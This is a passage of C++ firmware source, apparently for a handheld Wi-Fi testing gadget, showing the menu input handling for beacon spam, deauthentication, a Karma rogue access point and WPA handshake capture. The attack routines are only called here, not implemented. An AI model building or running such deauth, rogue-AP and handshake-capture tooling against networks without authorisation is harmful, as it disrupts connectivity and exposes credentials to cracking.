                if (spamTextLen < static_cast<int>(SPAM_BASE_MAX) && c >= 32 && c < 127) {
                    spamText[spamTextLen++] = c;
                    spamText[spamTextLen] = '\0';
                    changed = true;
                }
            }
            if (changed) drawSpamText();
        }
        break;

    case Screen::WifiSpamRun:
        if (back) {
            stopSpam();
            screen = Screen::WifiSpamSelect;
            drawSpamSelect();
        } else if (ks.enter) {
            if (spamRunning) {
                stopSpam();
            } else {
                startSpam();
            }
            drawSpamRun();
        } else if (wordHas(ks.word, 'h')) {
            spamHop = !spamHop;
            drawSpamRun();
        } else if (up || down) {
            if (!spamHop) {
                if (up) {
                    spamCh = spamCh <= CH_FIRST ? CH_LAST : spamCh - 1;
                } else {
                    spamCh = spamCh >= CH_LAST ? CH_FIRST : spamCh + 1;
                }
                setAnalyzerChannel(spamCh);
            }
            drawSpamRun();
        }
        break;
    case Screen::WifiDeauthSelect:
        if (pmfPassActive) {
            if (back) {
                stopPmfPass();
                drawDeauthSelect();
            }
            break;
        }
        if (back) {
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (up) {
            moveDeauthSelection(-1);
        } else if (down) {
            moveDeauthSelection(1);
        } else if (wordHas(ks.word, 'r')) {
            if (dlCount > 0) startPmfPass();
        } else if (ks.enter) {
            if (dlCount > 0) {
                chooseDeauthTarget();
                if (listPurpose == PURPOSE_HANDSHAKE) {
                    screen = Screen::WifiHsRun;
                    drawHandshake();
                } else {
                    screen = Screen::WifiDeauthCheck;
                    startDeauthCheck();
                }
            }
        }
        break;

    case Screen::WifiDeauthCheck:
        if (back) {
            stopDeauthCheck();
            screen = Screen::WifiDeauthSelect;
            drawDeauthSelect();
        } else if (wordHas(ks.word, 'r')) {
            stopDeauthCheck();
            startDeauthCheck();
        } else if (ks.enter && !checkActive && verdictAllowsDeauth(deauthVerdict)) {
            screen = Screen::WifiDeauthRun;
            drawDeauthRun();
        }
        break;

    case Screen::WifiDeauthRun:
        if (back) {
            stopDeauth();
            screen = Screen::WifiDeauthCheck;
            drawDeauthCheck();
        } else if (ks.enter) {
            if (deauthRunning) {
                stopDeauth();
            } else {
                startDeauth();
            }
            drawDeauthRun();
        }
        break;

    case Screen::WifiKarmaRun:
        if (back) {
            stopKarma();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (ks.enter) {
            if (karmaRunning) {
                stopKarma();
            } else {
                startKarma();
            }
            drawKarmaRun();
        } else if (wordHas(ks.word, 'h')) {
            karmaHop = !karmaHop;
            drawKarmaRun();
        } else if (up || down) {
            if (!karmaHop) {
                karmaCh = up ? (karmaCh <= CH_FIRST ? KARMA_CH_MAX : karmaCh - 1)
                             : (karmaCh >= KARMA_CH_MAX ? CH_FIRST : karmaCh + 1);
                if (karmaRunning) setAnalyzerChannel(karmaCh);
            }
            drawKarmaRun();
        }
        break;

    case Screen::WifiHsRun:
        if (back) {
            stopHandshake();
            hsDeauth = false;
            screen = Screen::WifiDeauthSelect;
            drawDeauthSelect();
        } else if (ks.enter) {
            if (hsRunning) {
                stopHandshake();
            } else {
                startHandshake();
            }
            drawHandshake();
        } else if (wordHas(ks.word, 'd')) {
            hsDeauth = !hsDeauth;
            drawHandshake();
        }
        break;
    }
}
